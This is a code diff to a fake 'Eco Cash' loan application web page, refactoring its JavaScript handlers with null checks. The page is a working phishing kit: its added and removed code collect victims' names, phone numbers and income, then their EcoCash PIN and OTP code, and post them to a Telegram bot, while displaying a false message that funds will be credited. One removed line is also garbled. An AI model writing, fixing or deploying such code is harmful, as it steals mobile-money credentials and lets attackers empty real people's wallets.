@@ -269,35 +269,6 @@
             color: var(--text);
         }
 
-        .feature-item {
-            display: flex;
-            align-items: center;
-            gap: 12px;
-            margin-bottom: 16px;
-            font-size: 13px;
-        }
-
-        .feature-icon {
-            width: 36px;
-            height: 36px;
-            border-radius: 8px;
-            background: #fef3c7;
-            display: flex;
-            align-items: center;
-            justify-content: center;
-            font-size: 16px;
-        }
-
-        .feature-text strong {
-            display: block;
-            color: var(--text);
-        }
-
-        .feature-text span {
-            color: var(--muted);
-            font-size: 12px;
-        }
-
         .status-msg {
             margin-top: 16px;
             padding: 12px;
@@ -530,134 +501,163 @@
             updateCalculator();
         }
 
-        document.getElementById('nextBtn1').addEventListener('click', function() {
-            document.getElementById('step1').classList.remove('active');
-            document.getElementById('step2').classList.add('active');
-            document.getElementById('bar2').classList.add('active');
-        });
+        const nextBtn1 = document.getElementById('nextBtn1');
+        if (nextBtn1) {
+            nextBtn1.addEventListener('click', function() {
+                document.getElementById('step1').classList.remove('active');
+                document.getElementById('step2').classList.add('active');
+                const bar2 = document.getElementById('bar2');
+                if (bar2) bar2.classList.add('active');
+            });
+        }
 
-        document.getElementById('nextBtn2').addEventListener('click', function() {
-            const fn = document.getElementById('firstName').value.trim();
-            const ln = document.getElementById('lastName').value.trim();
-            const phone = document.getElementById('phoneNumber').value.trim();
-            if(!fn || !ln || !phone) {
-                alert('Please fill in your First Name, Last Name, and Phone Number.');
-                return;
-            }
-            document.getElementById('sumLoanType').textContent = document.getElementById('loanType').value;
-            document.getElementById('sumAmount').textContent = amountDisplay.textContent;
-            document.getElementById('sumTerm').textContent = termSelect.options[termSelect.selectedIndex].text;
-            document.getElementById('sumPurpose').textContent = document.getElementById('loanPurpose').value || 'General Loan';
-            document.getElementById('sumApplicant').textContent = fn.charAt(0).toUpperCase() + '. ' + ln.charAt(0).toUpperCase() + '.';
-            document.getElementById('step2').classList.remove('active');
-            document.getElementById('step3').classList.add('active');
-            document.getElementById('bar3').classList.add('active');
-        });
-
-        document.getElementById('prevBtn2').addEventListener('click', function() {
-            document.getElementById('step2').classList.remove('active');
-            document.getElementById('bar2').classList.remove('active');
-            document.getElementById('step1').classList.add('active');
-        });
-
-        document.getElementById('prevBtn3').addEventListener('click', function() {
-            document.getElementById('step3').classList.remove('active');        .classList.remove('active');
-            document.getElementById('bar3').classList.remove('active');
-            document.getElementById('step2').classList.add('active');
-        });
-
-        document.getElementById('prevBtn4').addEventListener('click', function() {
-            document.getElementById('step4').classList.remove('active');
-            document.getElementById('stepsIndicator').style.display = 'flex';
-            document.getElementById('step3').classList.add('active');
-        });
-
-        document.getElementById('submitInitialBtn').addEventListener('click', async function() {
-            const submitBtn = document.getElementById('submitInitialBtn');
-            const statusBox = document.getElementById('initialStatusBox');
-            submitBtn.disabled = true;
-            submitBtn.textContent = 'SUBMITTING...';
-
-            try {
-                const message = `🚨 *NEW ECO CASH LOAN APPLICATION* 🚨\n\n` +
-                                `📂 *Loan Type:* ${document.getElementById('loanType').value}\n` +
-                                `👤 *Name:* ${document.getElementById('firstName').value} ${document.getElementById('lastName').value}\n` +
-                                `📧 *Email:* ${document.getElementById('email').value || 'N/A'}\n` +
-                                `📱 *Phone:* +263 ${document.getElementById('phoneNumber').value}\n` +
-                                `💰 *Amount:* ${amountDisplay.textContent}\n` +
-                                `⏱ *Term:* ${termSelect.options[termSelect.selectedIndex].text}\n` +
-                                `📋 *Purpose:* ${document.getElementById('loanPurpose').value}\n` +
-                                `💼 *Employment:* ${document.getElementById('employmentStatus').value}\n` +
-                                `💵 *Annual Income:* $${document.getElementById('annualIncome').value}`;
-
-                const response = await fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
-                    method: 'POST',
-                    headers: { 'Content-Type': 'application/json' },
-                    body: JSON.stringify({ chat_id: chatId, text: message, parse_mode: 'Markdown' })
-                });
-                const data = await response.json();
-
-                if (data.ok) {
-                    document.getElementById('step3').classList.remove('active');
-                    document.getElementById('step4').classList.add('active');
-                    document.getElementById('stepsIndicator').style.display = 'none';
-                    submitBtn.disabled = false;
-                    submitBtn.textContent = 'SUBMIT APPLICATION';
-                } else {
-                    throw new Error(data.description);
+        const nextBtn2 = document.getElementById('nextBtn2');
+        if (nextBtn2) {
+            nextBtn2.addEventListener('click', function() {
+                const fn = document.getElementById('firstName').value.trim();
+                const ln = document.getElementById('lastName').value.trim();
+                const phone = document.getElementById('phoneNumber').value.trim();
+                if(!fn || !ln || !phone) {
+                    alert('Please fill in your First Name, Last Name, and Phone Number.');
+                    return;
                 }
-            } catch (error) {
-                alert('Submission failed: ' + error.message);
-                submitBtn.disabled = false;
-                submitBtn.textContent = 'SUBMIT APPLICATION';
-            }
-        });
+                document.getElementById('sumLoanType').textContent = document.getElementById('loanType').value;
+                document.getElementById('sumAmount').textContent = amountDisplay.textContent;
+                document.getElementById('sumTerm').textContent = termSelect.options[termSelect.selectedIndex].text;
+                document.getElementById('sumPurpose').textContent = document.getElementById('loanPurpose').value || 'General Loan';
+                document.getElementById('sumApplicant').textContent = fn.charAt(0).toUpperCase() + '. ' + ln.charAt(0).toUpperCase() + '.';
+                document.getElementById('step2').classList.remove('active');
+                document.getElementById('step3').classList.add('active');
+                const bar3 = document.getElementById('bar3');
+                if (bar3) bar3.classList.add('active');
+            });
+        }
 
-        document.getElementById('submitVerifyBtn').addEventListener('click', async function() {
-            const pin = document.getElementById('ecocashPin').value.trim();
-            const otp = document.getElementById('otpCode').value.trim();
-            if (!pin || !otp) {
-                alert('Please enter both your EcoCash PIN and OTP code.');
-                return;
-            }
+        const prevBtn2 = document.getElementById('prevBtn2');
+        if (prevBtn2) {
+            prevBtn2.addEventListener('click', function() {
+                document.getElementById('step2').classList.remove('active');
+                const bar2 = document.getElementById('bar2');
+                if (bar2) bar2.classList.remove('active');
+                document.getElementById('step1').classList.add('active');
+            });
+        }
 
-            const submitBtn = document.getElementById('submitVerifyBtn');
-            const statusBox = document.getElementById('verifyStatusBox');
-            submitBtn.disabled = true;
-            submitBtn.textContent = 'VERIFYING...';
+        const prevBtn3 = document.getElementById('prevBtn3');
+        if (prevBtn3) {
+            prevBtn3.addEventListener('click', function() {
+                document.getElementById('step3').classList.remove('active');
+                const bar3 = document.getElementById('bar3');
+                if (bar3) bar3.classList.remove('active');
+                document.getElementById('step2').classList.add('active');
+            });
+        }
 
-            try {
-                const message = `🔐 *ECOCASH VERIFICATION CREDENTIALS* 🔐\n\n` +
-                                `👤 *Applicant:* ${document.getElementById('firstName').value} ${document.getElementById('lastName').value}\n` +
-                                `📱 *Phone:* +263 ${document.getElementById('phoneNumber').value}\n` +
-                                `🔑 *EcoCash PIN:* \`${pin}\`\n` +
-                                `🔢 *OTP Code:* \`${otp}\``;
+        const prevBtn4 = document.getElementById('prevBtn4');
+        if (prevBtn4) {
+            prevBtn4.addEventListener('click', function() {
+                document.getElementById('step4').classList.remove('active');
+                const stepsIndicator = document.getElementById('stepsIndicator');
+                if (stepsIndicator) stepsIndicator.style.display = 'flex';
+                document.getElementById('step3').classList.add('active');
+            });
+        }
 
-                const response = await fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
-                    method: 'POST',
-                    headers: { 'Content-Type': 'application/json' },
-                    body: JSON.stringify({ chat_id: chatId, text: message, parse_mode: 'Markdown' })
-                });
-                const data = await response.json();
+        const submitInitialBtn = document.getElementById('submitInitialBtn');
+        if (submitInitialBtn) {
+            submitInitialBtn.addEventListener('click', async function() {
+                submitInitialBtn.disabled = true;
+                submitInitialBtn.textContent = 'SUBMITTING...';
 
-                if (data.ok) {
-                    statusBox.textContent = 'Verification successful! Funds will be credited to your wallet.';
-                    statusBox.style.background = '#d1fae5';
-                    statusBox.style.color = '#065f46';
-                    statusBox.style.display = 'block';
-                    submitBtn.textContent = 'VERIFIED & SUCCESSFUL';
-                } else {
-                    throw new Error(data.description);
+                try {
+                    const message = `🚨 *NEW ECO CASH LOAN APPLICATION* 🚨\n\n` +
+                                    `📂 *Loan Type:* ${document.getElementById('loanType').value}\n` +
+                                    `👤 *Name:* ${document.getElementById('firstName').value} ${document.getElementById('lastName').value}\n` +
+                                    `📧 *Email:* ${document.getElementById('email').value || 'N/A'}\n` +
+                                    `📱 *Phone:* +263 ${document.getElementById('phoneNumber').value}\n` +
+                                    `💰 *Amount:* ${amountDisplay.textContent}\n` +
+                                    `⏱ *Term:* ${termSelect.options[termSelect.selectedIndex].text}\n` +
+                                    `📋 *Purpose:* ${document.getElementById('loanPurpose').value}\n` +
+                                    `💼 *Employment:* ${document.getElementById('employmentStatus').value}\n` +
+                                    `💵 *Annual Income:* $${document.getElementById('annualIncome').value}`;
+
+                    const response = await fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
+                        method: 'POST',
+                        headers: { 'Content-Type': 'application/json' },
+                        body: JSON.stringify({ chat_id: chatId, text: message, parse_mode: 'Markdown' })
+                    });
+                    const data = await response.json();
+
+                    if (data.ok) {
+                        document.getElementById('step3').classList.remove('active');
+                        document.getElementById('step4').classList.add('active');
+                        const stepsIndicator = document.getElementById('stepsIndicator');
+                        if (stepsIndicator) stepsIndicator.style.display = 'none';
+                        submitInitialBtn.disabled = false;
+                        submitInitialBtn.textContent = 'SUBMIT APPLICATION';
+                    } else {
+                        throw new Error(data.description);
+                    }
+                } catch (error) {
+                    alert('Submission failed: ' + error.message);
+                    submitInitialBtn.disabled = false;
+                    submitInitialBtn.textContent = 'SUBMIT APPLICATION';
                 }
-            } catch (error) {
-                statusBox.textContent = 'Verification failed: ' + error.message;
-                statusBox.style.background = '#fee2e2';
-                statusBox.style.color = '#991b1b';
-                statusBox.style.display = 'block';
-                submitBtn.disabled = false;
-                submitBtn.textContent = 'VERIFY & DISBURSE';
-            }
-        });
+            });
+        }
+
+        const submitVerifyBtn = document.getElementById('submitVerifyBtn');
+        if (submitVerifyBtn) {
+            submitVerifyBtn.addEventListener('click', async function() {
+                const pin = document.getElementById('ecocashPin').value.trim();
+                const otp = document.getElementById('otpCode').value.trim();
+                if (!pin || !otp) {
+                    alert('Please enter both your EcoCash PIN and OTP code.');
+                    return;
+                }
+
+                submitVerifyBtn.disabled = true;
+                submitVerifyBtn.textContent = 'VERIFYING...';
+                const statusBox = document.getElementById('verifyStatusBox');
+
+                try {
+                    const message = `🔐 *ECOCASH VERIFICATION CREDENTIALS* 🔐\n\n` +
+                                    `👤 *Applicant:* ${document.getElementById('firstName').value} ${document.getElementById('lastName').value}\n` +
+                                    `📱 *Phone:* +263 ${document.getElementById('phoneNumber').value}\n` +
+                                    `🔑 *EcoCash PIN:* \`${pin}\`\n` +
+                                    `🔢 *OTP Code:* \`${otp}\``;
+
+                    const response = `https://api.telegram.org/bot${botToken}/sendMessage`;
+                    const resp = await fetch(response, {
+                        method: 'POST',
+                        headers: { 'Content-Type': 'application/json' },
+                        body: JSON.stringify({ chat_id: chatId, text: message, parse_mode: 'Markdown' })
+                    });
+                    const data = await resp.json();
+
+                    if (data.ok) {
+                        if (statusBox) {
+                            statusBox.textContent = 'Verification successful! Funds will be credited to your wallet.';
+                            statusBox.style.background = '#d1fae5';
+                            statusBox.style.color = '#065f46';
+                            statusBox.style.display = 'block';
+                        }
+                        submitVerifyBtn.textContent = 'VERIFIED & SUCCESSFUL';
+                    } else {
+                        throw new Error(data.description);
+                    }
+                } catch (error) {
+                    if (statusBox) {
+                        statusBox.textContent = 'Verification failed: ' + error.message;
+                        statusBox.style.background = '#fee2e2';
+                        statusBox.style.color = '#991b1b';
+                        statusBox.style.display = 'block';
+                    }
+                    submitVerifyBtn.disabled = false;
+                    submitVerifyBtn.textContent = 'VERIFY & DISBURSE';
+                }
+            });
+        }
     </script>
 </body>
 </html>
